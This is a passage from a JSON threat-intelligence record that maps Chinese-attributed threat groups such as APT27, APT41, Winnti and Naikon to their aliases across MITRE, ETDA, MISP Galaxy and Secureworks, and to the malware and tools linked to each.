            "deleted_at": null,
            "main_name": "Operation Soft Cell",
            "aliases": [],
            "source_name": "MISPGALAXY:Operation Soft Cell",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5bbced13-72f7-40dc-8c41-dcce75bf885e",
            "created_at": "2022-10-25T15:50:23.695735Z",
            "updated_at": "2025-03-27T02:00:55.525839Z",
            "deleted_at": null,
            "main_name": "Winnti Group",
            "aliases": [
                "Winnti Group"
            ],
            "source_name": "MITRE:Winnti Group",
            "tools": [
                "PipeMon",
                "Winnti for Windows",
                "PlugX"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "f3b19931-3751-4ece-a235-15b397951dc2",
            "created_at": "2022-10-25T16:07:23.889537Z",
            "updated_at": "2025-03-27T02:02:10.015565Z",
            "deleted_at": null,
            "main_name": "Nazar",
            "aliases": [
                "SIG37"
            ],
            "source_name": "ETDA:Nazar",
            "tools": [
                "Distribute.exe",
                "EYService",
                "GpUpdates.exe",
                "Microolap Packet Sniffer",
                "TCPDUMP for Windows"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "761d1fb2-60e3-46f0-9f1c-c8a9715967d4",
            "created_at": "2023-01-06T13:46:38.269054Z",
            "updated_at": "2025-03-27T02:00:02.789278Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "TG-0110",
                "Group 6",
                "Buckeye",
                "Boyusec",
                "BORON",
                "BRONZE MAYFAIR",
                "Red Sylvan",
                "GOTHIC PANDA"
            ],
            "source_name": "MISPGALAXY:APT3",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "30ed778d-15b3-484e-a90b-e1e05b36a42f",
            "created_at": "2023-01-06T13:46:38.290626Z",
            "updated_at": "2025-03-27T02:00:02.795711Z",
            "deleted_at": null,
            "main_name": "APT30",
            "aliases": [
                "G0013"
            ],
            "source_name": "MISPGALAXY:APT30",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "945a572f-ebe3-4e2f-a288-512fe751cfa8",
            "created_at": "2022-10-25T16:07:24.413971Z",
            "updated_at": "2025-03-27T02:02:10.212853Z",
            "deleted_at": null,
            "main_name": "Winnti Group",
            "aliases": [
                "Wicked Panda",
                "Winnti Group"
            ],
            "source_name": "ETDA:Winnti Group",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "FunnySwitch",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "7bf3ffe5-09ba-4378-8ea4-a6d748a494fd",
            "created_at": "2022-10-25T15:50:23.264584Z",
            "updated_at": "2025-03-27T02:00:55.414817Z",
            "deleted_at": null,
            "main_name": "GALLIUM",
            "aliases": [
                "GALLIUM",
                "Granite Typhoon"
            ],
            "source_name": "MITRE:GALLIUM",
            "tools": [
                "ipconfig",
                "cmd",
                "China Chopper",
                "PoisonIvy",
                "at",
                "PlugX",
                "PingPull",
                "BlackMould",
                "Mimikatz",
                "PsExec",
                "HTRAN",
                "NBTscan",
                "Windows Credential Editor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "13354d3f-3f40-44ec-b42a-3cda18809005",
            "created_at": "2022-10-25T15:50:23.275272Z",
            "updated_at": "2025-03-27T02:00:55.418075Z",
            "deleted_at": null,
            "main_name": "APT3",
            "aliases": [
                "APT3",
                "Gothic Panda",
                "Pirpi",
                "UPS Team",
                "Buckeye",
                "Threat Group-0110",
                "TG-0110"
            ],
            "source_name": "MITRE:APT3",
            "tools": [
                "OSInfo",
                "schtasks",
                "PlugX",
                "LaZagne",
                "SHOTPUT",
                "RemoteCMD"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2704d770-43b4-4bc4-8a5a-05df87416848",
            "created_at": "2022-10-25T15:50:23.306305Z",
            "updated_at": "2025-03-27T02:00:55.43633Z",
            "deleted_at": null,
            "main_name": "HAFNIUM",
            "aliases": [
                "HAFNIUM",
                "Operation Exchange Marauder",
                "Silk Typhoon"
            ],
            "source_name": "MITRE:HAFNIUM",
            "tools": [
                "Tarrask",
                "ASPXSpy",
                "Impacket",
                "PsExec",
                "China Chopper"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e3492534-85a6-4c87-a754-5ae4a56d7c8c",
            "created_at": "2022-10-25T15:50:23.819113Z",
            "updated_at": "2025-03-27T02:00:55.552554Z",
            "deleted_at": null,
            "main_name": "Threat Group-3390",
            "aliases": [
                "Threat Group-3390",
                "Earth Smilodon",
                "TG-3390",
                "Emissary Panda",
                "BRONZE UNION",
                "APT27",
                "Iron Tiger",
                "LuckyMouse"
            ],
            "source_name": "MITRE:Threat Group-3390",
            "tools": [
                "Systeminfo",
                "gsecdump",
                "PlugX",
                "ASPXSpy",
                "Cobalt Strike",
                "Mimikatz",
                "Impacket",
                "gh0st RAT",
                "certutil",
                "China Chopper",
                "HTTPBrowser",
                "Tasklist",
                "netstat",
                "SysUpdate",
                "HyperBro",
                "ZxShell",
                "RCSession",
                "ipconfig",
                "Clambling",
                "pwdump",
                "NBTscan",
                "Pandora",
                "Windows Credential Editor"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2c980ea7-04c4-4193-8535-52f87e66a96e",
            "created_at": "2024-05-01T02:03:07.994126Z",
            "updated_at": "2025-03-27T02:05:17.293799Z",
            "deleted_at": null,
            "main_name": "BRONZE UNION",
            "aliases": [
                "Budworm ",
                "Emissary Panda ",
                "Iron Tiger ",
                "Lucky Mouse ",
                "TG-3390 ",
                "Temp.Hippo ",
                "APT27 "
            ],
            "source_name": "Secureworks:BRONZE UNION",
            "tools": [
                " ASPXSpy",
                " China Chopper",
                " Enfal",
                " Gh0st RAT",
                " HttpBrowser",
                " Hunter",
                " HyperBro",
                " OwaAuth",
                " PlugX",
                " PoisonIvy",
                " Sysupdate",
                " ZxShell",
                "9002"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ad154227-6fcf-43c5-a540-0c09534e040f",
            "created_at": "2024-05-01T02:03:07.952927Z",
            "updated_at": "2025-03-27T02:05:17.267077Z",
            "deleted_at": null,
            "main_name": "BRONZE GENEVA",
            "aliases": [
                "BRONZE STERLING ",
                "CTG-5326 ",
                "Naikon ",
                "Override Panda ",
                "APT30 "
            ],
            "source_name": "Secureworks:BRONZE GENEVA",
            "tools": [
                " ShadowPad",
                "Lecna"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f74e4fe6-6281-45e7-8866-0ff4316381cc",
            "created_at": "2024-05-01T02:03:07.959101Z",
            "updated_at": "2025-03-27T02:05:17.270819Z",
            "deleted_at": null,
            "main_name": "BRONZE HOBART",
            "aliases": [
                "Pirate Panda ",
                "Tropic Trooper ",
                "KeyBoy "
            ],
            "source_name": "Secureworks:BRONZE HOBART",
            "tools": [
                " KeyBoy",
                " Pfine",
                "DSNGInstaller"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a2912fc0-c34e-4e4b-82e9-665416c8fe32",
            "created_at": "2023-04-20T02:01:50.979595Z",
            "updated_at": "2025-03-27T02:00:02.79494Z",
            "deleted_at": null,
            "main_name": "Naikon",
            "aliases": [
                "BRONZE GENEVA",
                "G0019",
                "Naikon",
                "BRONZE STERLING",
                "G0013",
                "PLA Unit 78020",
                "OVERRIDE PANDA",
                "Camerashy"
            ],
            "source_name": "MISPGALAXY:Naikon",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "c63ab035-f9f2-4723-959b-97a7b98b5942",
            "created_at": "2023-01-06T13:46:38.298354Z",
            "updated_at": "2025-03-27T02:00:02.798255Z",
            "deleted_at": null,
            "main_name": "APT27",
            "aliases": [
                "TG-3390",
                "EMISSARY PANDA",
                "TEMP.Hippo",
                "Budworm",
                "Group 35",
                "BRONZE UNION",
                "Lucky Mouse",
                "Iron Taurus",
                "GreedyTaotie",
                "Red Phoenix",
                "ZipToken",
                "Iron Tiger",
                "G0027",
                "Earth Smilodon"
            ],
            "source_name": "MISPGALAXY:APT27",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "61ea51ed-a419-4b05-9241-5ab0dbba25fc",
            "created_at": "2023-01-06T13:46:38.354607Z",
            "updated_at": "2025-03-27T02:00:02.81258Z",
            "deleted_at": null,
            "main_name": "APT23",
            "aliases": [
                "KeyBoy",
                "Tropic Trooper",
                "BRONZE HOBART",
                "G0081",
                "Red Orthrus",
                "Earth Centaur",
                "PIRATE PANDA"
            ],
            "source_name": "MISPGALAXY:APT23",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f1ce7e3-77cd-4af0-bedb-1643f55c9baf",
            "created_at": "2022-10-25T15:50:23.31611Z",
            "updated_at": "2025-03-27T02:00:55.439974Z",
            "deleted_at": null,
            "main_name": "Naikon",
            "aliases": [
                "Naikon"
            ],
            "source_name": "MITRE:Naikon",
            "tools": [
                "ftp",
                "netsh",
                "WinMM",
                "Systeminfo",
                "RainyDay",
                "RARSTONE",
                "HDoor",
                "Sys10",
                "SslMM",
                "PsExec",
                "Tasklist",
                "Aria-body"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "bef7800a-a08f-4e21-b65c-4279c851e572",
            "created_at": "2022-10-25T15:50:23.409336Z",
            "updated_at": "2025-03-27T02:00:55.463048Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "Tropic Trooper",
                "Pirate Panda",
                "KeyBoy"
            ],
            "source_name": "MITRE:Tropic Trooper",
            "tools": [
                "USBferry",
                "ShadowPad",
                "PoisonIvy",
                "BITSAdmin",
                "YAHOYAH",
                "KeyBoy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "5c13338b-eaed-429a-9437-f5015aa98276",
            "created_at": "2022-10-25T16:07:23.582715Z",
            "updated_at": "2025-03-27T02:02:09.875151Z",
            "deleted_at": null,
            "main_name": "Emissary Panda",
            "aliases": [
                "APT 27",
                "ATK 15",
                "Bronze Union",
                "Budworm",
                "Earth Smilodon",
                "Emissary Panda",
                "Group 35",
                "Iron Taurus",
                "Iron Tiger",
                "LuckyMouse",
                "Operation DRBControl",
                "Operation Iron Tiger",
                "Operation PZChao",
                "Operation SpoiledLegacy",
                "Operation StealthyTrident",
                "Red Phoenix",
                "TEMP.Hippo",
                "TG-3390",
                "ZipToken"
            ],
            "source_name": "ETDA:Emissary Panda",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agent.dhwf",
                "AngryRebel",
                "Antak",
                "CHINACHOPPER",
                "China Chopper",
                "Destroy RAT",
                "DestroyRAT",
                "FOCUSFJORD",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HTTPBrowser",
                "HTran",
                "HUC Packet Transmit Tool",
                "HighShell",
                "HttpBrowser RAT",
                "HttpDump",
                "HyperBro",
                "HyperSSL",
                "HyperShell",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "Nishang",
                "OwaAuth",
                "PCRat",
                "PlugX",
                "ProcDump",
                "PsExec",
                "RedDelta",
                "SEASHARPEE",
                "Sensocode",
                "SinoChopper",
                "Sogu",
                "SysUpdate",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Token Control",
                "TokenControl",
                "TwoFace",
                "WCE",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Xamtrav",
                "ZXShell",
                "gsecdump",
                "luckyowa"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "578f8e62-2bb4-4ce4-a8b7-6c868fa29724",
            "created_at": "2022-10-25T16:07:24.344358Z",
            "updated_at": "2025-03-27T02:02:10.182282Z",
            "deleted_at": null,
            "main_name": "Tropic Trooper",
            "aliases": [
                "APT 23",
                "Bronze Hobart",
                "Earth Centaur",
                "KeyBoy",
                "Operation Tropic Trooper",
                "Pirate Panda",
                "Tropic Trooper"
            ],
            "source_name": "ETDA:Tropic Trooper",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "ByPassGodzilla",
                "CHINACHOPPER",
                "CREDRIVER",
                "China Chopper",
                "Chymine",
                "Darkmoon",
                "Gen:Trojan.Heur.PT",
                "KeyBoy",
                "Neo-reGeorg",
                "PCShare",
                "POISONPLUG.SHADOW",
                "Poison Ivy",
                "RoyalRoad",
                "SPIVY",
                "ShadowPad Winnti",
                "SinoChopper",
                "Swor",
                "TSSL",
                "USBferry",
                "W32/Seeav",
                "Winsloader",
                "XShellGhost",
                "Yahoyah",
                "fscan",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "04b07437-41bb-4126-bcbb-def16f19d7c6",
            "created_at": "2022-10-25T16:07:24.232628Z",
            "updated_at": "2025-03-27T02:02:10.146043Z",
            "deleted_at": null,
            "main_name": "Stone Panda",
            "aliases": [
                "APT 10",
                "ATK 41",
                "Bronze Riverside",
                "CTG-5938",
                "CVNX",
                "Cuckoo Spear",
                "Earth Kasha",
                "Granite Taurus",
                "Happyyongzi",
                "Hogfish",
                "ITG01",
                "Operation A41APT",
                "Operation Cache Panda",
                "Operation ChessMaster",
                "Operation Cloud Hopper",
                "Operation Cuckoo Spear",
                "Operation New Battle",
                "Operation Soft Cell",
                "Operation TradeSecret",
                "Potassium",
                "Red Apollo",
                "Stone Panda",
                "TA429",
                "menuPass",
                "menuPass Team"
            ],
            "source_name": "ETDA:Stone Panda",
            "tools": [
                "Agent.dhwf",
                "Agentemis",
                "Anel",
                "AngryRebel",
                "BKDR_EVILOGE",
                "BKDR_HGDER",
                "BKDR_NVICM",
                "BUGJUICE",
                "CHINACHOPPER",
                "ChChes",
                "China Chopper",
                "Chymine",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "DARKTOWN",
                "DESLoader",
                "DILLJUICE",
                "DILLWEED",
                "Darkmoon",
                "DelfsCake",
                "Derusbi",
                "Destroy RAT",
                "DestroyRAT",
                "Ecipekac",
                "Emdivi",
                "EvilGrab",
                "EvilGrab RAT",
                "FYAnti",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "GreetCake",
                "HAYMAKER",
                "HEAVYHAND",
                "HEAVYPOT",
                "HTran",
                "HUC Packet Transmit Tool",
                "Ham Backdoor",
                "HiddenFace",
                "Impacket",
                "Invoke the Hash",
                "KABOB",
                "Kaba",
                "Korplug",
                "LODEINFO",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "MiS-Type",
                "Mimikatz",
                "Moudour",
                "Mydoor",
                "NBTscan",
                "NOOPDOOR",
                "Newsripper",
                "P8RAT",
                "PCRat",
                "PlugX",
                "Poison Ivy",
                "Poldat",
                "PowerSploit",
                "PowerView",
                "PsExec",
                "PsList",
                "Quarks PwDump",
                "Quasar RAT",
                "QuasarRAT",
                "RedDelta",
                "RedLeaves",
                "Rubeus",
                "SNUGRIDE",
                "SPIVY",
                "SharpSploit",
                "SigLoader",
                "SinoChopper",
                "SodaMaster",
                "Sogu",
                "TIGERPLUG",
                "TVT",
                "Thoper",
                "Trochilus RAT",
                "UpperCut",
                "Vidgrab",
                "WinRAR",
                "WmiExec",
                "Wmonder",
                "Xamtrav",
                "Yggdrasil",
                "Zlib",
                "certutil",
                "certutil.exe",
                "cobeacon",
                "dfls",
                "lena",
                "nbtscan",
                "pivy",
                "poisonivy",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b69484be-98d1-49e6-aed1-a28dbf65176a",
            "created_at": "2022-10-25T16:07:23.886782Z",
            "updated_at": "2025-03-27T02:02:10.014032Z",
            "deleted_at": null,
            "main_name": "Naikon",
            "aliases": [
                "Hellsing",
                "ITG06",
                "Lotus Panda",
                "Naikon",
                "Operation CameraShy"
            ],
            "source_name": "ETDA:Naikon",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "AR",
                "ARL",
                "Agent.dhwf",
                "Aria-body",
                "Aria-body loader",
                "Asset Reconnaissance Lighthouse",
                "BackBend",
                "Creamsicle",
                "Custom HDoor",
                "Destroy RAT",
                "DestroyRAT",
                "Flashflood",
                "FoundCore",
                "Gemcutter",
                "HDoor",
                "JadeRAT",
                "Kaba",
                "Korplug",
                "LOLBAS",
                "LOLBins",
                "LadonGo",
                "Lecna",
                "Living off the Land",
                "NBTscan",
                "Naikon",
                "NetEagle",
                "Neteagle_Scout",
                "NewCore RAT",
                "Orangeade",
                "PlugX",
                "Quarks PwDump",
                "RARSTONE",
                "RainyDay",
                "RedDelta",
                "RoyalRoad",
                "Sacto",
                "Sandboxie",
                "ScoutEagle",
                "Shipshape",
                "Sisfader",
                "Sisfader RAT",
                "Sogu",
                "SslMM",
                "Sys10",
                "TIGERPLUG",
                "TVT",
                "TeamViewer",
                "Thoper",
                "WinMM",
                "Xamtrav",
                "XsFunction",
                "ZRLnk",
                "nbtscan",
                "nokian",
                "norton",
                "xsControl",
                "xsPlus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535953,
    "ts_updated_at": 1743041844,
    "ts_creation_date": 1653693043,
    "ts_modification_date": 1653693043,
    "files": {
        "pdf": "https://archive.orkl.eu/721e2aa276476686753ce4cd7610a2c34b2f82f0.pdf",
        "text": "https://archive.orkl.eu/721e2aa276476686753ce4cd7610a2c34b2f82f0.txt",
        "img": "https://archive.orkl.eu/721e2aa276476686753ce4cd7610a2c34b2f82f0.jpg"
    }
}